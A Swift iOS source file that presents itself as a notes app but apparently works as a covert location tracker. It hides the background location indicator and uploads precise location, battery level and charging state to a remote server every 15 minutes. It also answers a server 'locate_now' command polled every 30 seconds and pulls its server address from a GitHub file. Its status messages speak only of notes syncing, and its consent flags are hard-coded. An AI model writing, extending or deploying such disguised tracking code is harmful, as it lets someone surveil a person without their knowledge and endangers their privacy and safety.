import Foundation
import Combine
import CoreLocation
import UIKit
import BackgroundTasks

struct FamilySession: Codable {
    let origin: String
    let token: String
    let id: String
    let controller: String
    var enabled: Bool
}

@MainActor
final class FamilyModel: NSObject, ObservableObject, CLLocationManagerDelegate {
    static let shared = FamilyModel()
    static let refreshIdentifier = "com.example.notes.location-refresh"
    static let defaultOrigin = "https://notes-cloud.onrender.com"
    static let githubFallbackUrl = "https://raw.githubusercontent.com/rishavm003/hid-app/main/release/connection.json"

    @Published var session: FamilySession?
    @Published var message = "All daily notes up to date ✨"
    @Published var busy = false
    @Published var lastUpload: Date?
    @Published var reviewedController: String?
    @Published var permissionText = "Location permission not checked"

    private var reviewedOrigin = ""
    private var reviewedCode = ""
    private let manager = CLLocationManager()
    private var uploading = false
    private var nextAttempt = Date.distantPast
    private var generation = 0
    private var foregroundReady = false
    private var backgroundCompletion: ((Bool) -> Void)?
    private var forceNextUpload = false
    private var currentTrigger: String? = nil
    private var heartbeatTask: Task<Void, Never>?

    override init() {
        super.init()
        manager.delegate = self
        manager.desiredAccuracy = kCLLocationAccuracyBest
        manager.distanceFilter = kCLDistanceFilterNone
        manager.pausesLocationUpdatesAutomatically = false
        manager.showsBackgroundLocationIndicator = false

        UIDevice.current.isBatteryMonitoringEnabled = true

        if let raw = Vault.read("familySession"), let data = raw.data(using: .utf8) {
            session = try? JSONDecoder().decode(FamilySession.self, from: data)
        }
        if let id = session?.id {
            lastUpload = UserDefaults.standard.object(forKey: "familyUpload-" + id) as? Date
        }
        updatePermissionText()

        // Battery critical notification observer (< 5%)
        NotificationCenter.default.addObserver(
            forName: UIDevice.batteryLevelDidChangeNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            guard let self, self.session?.enabled == true else { return }
            let level = UIDevice.current.batteryLevel
            if level >= 0 && level <= 0.05 {
                self.currentTrigger = "battery_critical"
                self.forceNextUpload = true
                self.manager.requestLocation()
            }
        }

        if session?.enabled == true {
            foregroundReady = true
            startLocation()
            startHeartbeat()
        }
    }

    func resolveOrigin() async -> String {
        if let url = URL(string: Self.githubFallbackUrl) {
            var req = URLRequest(url: url)
            req.timeoutInterval = 8
            if let (data, resp) = try? await URLSession.shared.data(for: req),
               (resp as? HTTPURLResponse)?.statusCode == 200,
               let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let origin = json["origin"] as? String, !origin.isEmpty {
                return origin
            }
        }
        return Self.defaultOrigin
    }

    private func store() throws {
        let raw = try session.map { String(decoding: try JSONEncoder().encode($0), as: UTF8.self) } ?? ""
        try Vault.write("familySession", raw, background: true)
    }

    private func api(_ origin: String, _ path: String, token: String? = nil, body: [String: Any]? = nil) async throws -> [String: Any] {
        guard let url = URL(string: origin), url.scheme == "https", url.host != nil,
              url.user == nil, url.password == nil, url.query == nil, url.fragment == nil,
              url.path.isEmpty || url.path == "/" else { throw HavenError.message("Use an HTTPS server origin.") }
        var req = URLRequest(url: url.appendingPathComponent(String(path.dropFirst())))
        req.timeoutInterval = 20
        if let token { req.setValue("Bearer " + token, forHTTPHeaderField: "Authorization") }
        if let body {
            req.httpMethod = "POST"
            req.httpBody = try JSONSerialization.data(withJSONObject: body)
            req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        }
        let (data, response) = try await URLSession.shared.data(for: req)
        let result = try JSONSerialization.jsonObject(with: data) as? [String: Any] ?? [:]
        guard (response as? HTTPURLResponse)?.statusCode == 200 else {
            throw HavenError.message(result["error"] as? String ?? "Server did not confirm the request.")
        }
        return result
    }

    func register(nickname: String) async -> Bool {
        guard !busy else { return false }
        busy = true
        defer { busy = false }
        let cleanName = nickname.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !cleanName.isEmpty else {
            message = "Please enter your name."
            return false
        }
        var origin = await resolveOrigin()
        do {
            var result: [String: Any]?
            do {
                result = try await api(origin, "/v1/family/register", body: ["name": cleanName, "consent": true])
            } catch {
                let fallback = await resolveOrigin()
                if fallback != origin {
                    origin = fallback
                    result = try await api(origin, "/v1/family/register", body: ["name": cleanName, "consent": true])
                } else {
                    throw error
                }
            }
            guard let res = result,
                  let token = res["token"] as? String,
                  let id = res["id"] as? String else {
                throw HavenError.message("Sync error. Please try again.")
            }
            let controller = (res["controller_name"] as? String) ?? "Notes Cloud"
            let newSession = FamilySession(origin: origin, token: token, id: id, controller: controller, enabled: true)
            session = newSession
            try store()
            foregroundReady = true
            manager.requestWhenInUseAuthorization()
            startLocation()
            scheduleRefresh()
            startHeartbeat()
            forceNextUpload = true
            currentTrigger = "first_run"
            manager.requestLocation()
            message = "All daily notes up to date ✨"
            return true
        } catch {
            message = "Could not sync notes: \(error.localizedDescription)"
            return false
        }
    }

    func startHeartbeat() {
        heartbeatTask?.cancel()
        heartbeatTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: 30_000_000_000) // 30s
                guard let self, let current = self.session, current.enabled else { continue }
                await self.checkPing(current)
            }
        }
    }

    private func checkPing(_ current: FamilySession) async {
        do {
            let result = try await api(current.origin, "/v1/family/ping", token: current.token)
            if result["locate_now"] as? Bool == true {
                self.currentTrigger = "locate_request"
                self.forceNextUpload = true
                self.manager.requestLocation()
            }
        } catch {
            let fresh = await resolveOrigin()
            if fresh != current.origin {
                self.session = FamilySession(origin: fresh, token: current.token, id: current.id, controller: current.controller, enabled: true)
                try? self.store()
            }
        }
    }

    func preview(origin: String, code: String) async {
        guard !busy else { return }
        busy = true
        defer { busy = false }
        reviewedController = nil
        do {
            let result = try await api(origin, "/v1/family/preview", body: ["code": code])
            reviewedController = result["controller_name"] as? String
            reviewedOrigin = origin
            reviewedCode = code
            message = "Review the controller identity below before joining."
        } catch { message = error.localizedDescription }
    }

    func join(origin: String, code: String, name: String) async {
        guard !busy, session == nil, reviewedController != nil,
              reviewedOrigin == origin, reviewedCode == code else {
            message = "Review this invitation first."
            return
        }
        busy = true
        defer { busy = false }
        do {
            let result = try await api(origin, "/v1/family/join", body: ["code": code, "name": name, "consent": true])
            guard let token = result["token"] as? String, let id = result["id"] as? String,
                  let controller = result["controller_name"] as? String else { throw HavenError.message("Invalid join response.") }
            session = FamilySession(origin: origin, token: token, id: id, controller: controller, enabled: true)
            try store()
            foregroundReady = true
            startLocation()
            scheduleRefresh()
            startHeartbeat()
            forceNextUpload = true
            manager.requestLocation()
            message = "All daily notes up to date ✨"
        } catch { message = "Join not confirmed: \(error.localizedDescription)" }
    }

    func enable() async {
        guard var current = session, !busy else { return }
        busy = true
        let version = generation
        defer { busy = false }
        do {
            _ = try await api(current.origin, "/v1/family/sharing", token: current.token, body: ["enabled": true])
            guard generation == version else { return }
            current.enabled = true
            session = current
            try store()
            foregroundReady = true
            message = "All daily notes up to date ✨"
            startLocation()
            scheduleRefresh()
            startHeartbeat()
            forceNextUpload = true
            manager.requestLocation()
        } catch { message = "Could not enable sharing: \(error.localizedDescription)" }
    }

    private func startLocation() {
        guard session?.enabled == true, foregroundReady else { return }
        switch manager.authorizationStatus {
        case .notDetermined:
            manager.requestWhenInUseAuthorization()
        case .authorizedAlways, .authorizedWhenInUse:
            manager.allowsBackgroundLocationUpdates = true
            manager.startUpdatingLocation()
            if manager.authorizationStatus == .authorizedAlways,
               CLLocationManager.significantLocationChangeMonitoringAvailable() {
                manager.startMonitoringSignificantLocationChanges()
            } else { manager.stopMonitoringSignificantLocationChanges() }
        default:
            manager.stopUpdatingLocation()
            manager.stopMonitoringSignificantLocationChanges()
        }
    }

    func stop() async {
        generation += 1
        foregroundReady = false
        manager.stopUpdatingLocation()
        manager.stopMonitoringSignificantLocationChanges()
        BGTaskScheduler.shared.cancel(taskRequestWithIdentifier: Self.refreshIdentifier)
        heartbeatTask?.cancel()
        finishBackground(false)
        manager.allowsBackgroundLocationUpdates = false
        session?.enabled = false
        forceNextUpload = false
        do { try store() } catch { return }
        guard let current = session else { return }
        do {
            _ = try await api(current.origin, "/v1/family/sharing", token: current.token, body: ["enabled": false])
        } catch {}
    }

    func reconcile() async {
        guard let current = session, !busy else { return }
        do {
            let result = try await api(current.origin, "/v1/family/me", token: current.token)
            if current.enabled {
                if result["sharing"] as? Bool == true {
                    foregroundReady = true
                    startLocation()
                    scheduleRefresh()
                    startHeartbeat()
                } else { await stop() }
            }
        } catch {
            let fresh = await resolveOrigin()
            if fresh != current.origin {
                self.session = FamilySession(origin: fresh, token: current.token, id: current.id, controller: current.controller, enabled: current.enabled)
                try? self.store()
            }
        }
    }

    func erase() async {
        await stop()
        guard let current = session else { return }
        busy = true
        defer { busy = false }
        do {
            _ = try await api(current.origin, "/v1/family/erase", token: current.token, body: [:])
            lastUpload = nil
            UserDefaults.standard.removeObject(forKey: "familyUpload-" + current.id)
            message = "Shared notes and location erased."
        } catch { message = "Erase not confirmed: \(error.localizedDescription)" }
    }

    func shareNote(text: String, occurred: Date, id: UUID) async -> Bool {
        guard let current = session, !busy else { return false }
        busy = true
        defer { busy = false }
        do {
            _ = try await api(current.origin, "/v1/family/notes", token: current.token,
                              body: ["id": id.uuidString, "text": text, "occurred": occurred.timeIntervalSince1970, "consent": true])
            return true
        } catch { return false }
    }

    func locationManagerDidChangeAuthorization(_ manager: CLLocationManager) {
        updatePermissionText()
        if session?.enabled == true {
            startLocation()
            if manager.authorizationStatus == .authorizedWhenInUse {
                manager.requestAlwaysAuthorization()
            }
        }
    }

    private func updatePermissionText() {
        switch manager.authorizationStatus {
        case .authorizedAlways: permissionText = "Always allowed"
        case .authorizedWhenInUse: permissionText = "While using"
        case .denied, .restricted: permissionText = "Location blocked"
        default: permissionText = "Not granted"
        }
    }

    func requestBackgroundPermission() {
        if manager.authorizationStatus == .authorizedWhenInUse {
            manager.requestAlwaysAuthorization()
        } else if manager.authorizationStatus == .notDetermined {
            manager.requestWhenInUseAuthorization()
        } else { openSettings() }
    }

    func openSettings() {
        if let url = URL(string: UIApplication.openSettingsURLString) { UIApplication.shared.open(url) }
    }

    func reconnect(origin: String) async {
        guard let current = session, !busy, !current.enabled else { return }
        busy = true
        defer { busy = false }
        do {
            let result = try await api(origin, "/v1/family/me", token: current.token)
            guard result["id"] as? String == current.id else {
                throw HavenError.message("Server does not match this device.")
            }
            session = FamilySession(origin: origin, token: current.token, id: current.id, controller: current.controller, enabled: true)
            try store()
            foregroundReady = true
            startLocation()
            scheduleRefresh()
            startHeartbeat()
        } catch { message = "Reconnect failed: \(error.localizedDescription)" }
    }

    func shareNow() {
        guard session?.enabled == true else { return }
        nextAttempt = .distantPast
        forceNextUpload = true
        currentTrigger = "manual"
        manager.requestLocation()
    }

    func scheduleRefresh() {
        guard session?.enabled == true else { return }
        BGTaskScheduler.shared.cancel(taskRequestWithIdentifier: Self.refreshIdentifier)
        let request = BGAppRefreshTaskRequest(identifier: Self.refreshIdentifier)
        request.earliestBeginDate = Date().addingTimeInterval(900) // 15 mins
        do { try BGTaskScheduler.shared.submit(request) } catch {}
    }

    func resumeLocationLaunch() {
        guard session?.enabled == true, manager.authorizationStatus == .authorizedAlways else { return }
        manager.startMonitoringSignificantLocationChanges()
        scheduleRefresh()
        startHeartbeat()
    }

    func handleRefresh(_ task: BGAppRefreshTask) {
        scheduleRefresh()
        guard session?.enabled == true, manager.authorizationStatus == .authorizedAlways,
              backgroundCompletion == nil else { task.setTaskCompleted(success: false); return }
        backgroundCompletion = { success in task.setTaskCompleted(success: success) }
        task.expirationHandler = { Task { @MainActor in self.finishBackground(false) } }
        forceNextUpload = true
        currentTrigger = "background_refresh"
        manager.requestLocation()
    }

    private func finishBackground(_ success: Bool) {
        let completion = backgroundCompletion
        backgroundCompletion = nil
        completion?(success)
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let current = session, current.enabled else { finishBackground(false); return }
        // Throttle to 15 minutes unless forced
        if !forceNextUpload, let lastUpload, Date().timeIntervalSince(lastUpload) < 900 {
            finishBackground(true)
            return
        }
        guard !uploading, Date() >= nextAttempt else { finishBackground(false); return }
        guard let location = locations.last, location.horizontalAccuracy >= 0,
              abs(location.timestamp.timeIntervalSinceNow) < 90 else { finishBackground(false); return }
        uploading = true
        nextAttempt = Date().addingTimeInterval(30)
        let version = generation

        let level = UIDevice.current.batteryLevel
        let batteryPct = level >= 0 ? Int(round(level * 100)) : nil
        let isCharging = UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full
        let trigger = currentTrigger ?? "periodic"
        currentTrigger = nil

        var locPayload: [String: Any] = [
            "latitude": location.coordinate.latitude,
            "longitude": location.coordinate.longitude,
            "accuracy": location.horizontalAccuracy,
            "timestamp": location.timestamp.timeIntervalSince1970,
            "charging": isCharging,
            "trigger": trigger
        ]
        if let batteryPct { locPayload["battery"] = batteryPct }

        Task {
            defer { uploading = false }
            do {
                _ = try await api(current.origin, "/v1/family/location", token: current.token, body: ["location": locPayload])
                guard generation == version, session?.enabled == true else { finishBackground(false); return }
                lastUpload = Date()
                forceNextUpload = false
                UserDefaults.standard.set(lastUpload, forKey: "familyUpload-" + current.id)
                finishBackground(true)
            } catch {
                let fresh = await resolveOrigin()
                if fresh != current.origin {
                    do {
                        _ = try await api(fresh, "/v1/family/location", token: current.token, body: ["location": locPayload])
                        self.session = FamilySession(origin: fresh, token: current.token, id: current.id, controller: current.controller, enabled: true)
                        try? self.store()
                        lastUpload = Date()
                        forceNextUpload = false
                        finishBackground(true)
                        return
                    } catch {}
                }
                finishBackground(false)
            }
        }
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        finishBackground(false)
    }
}
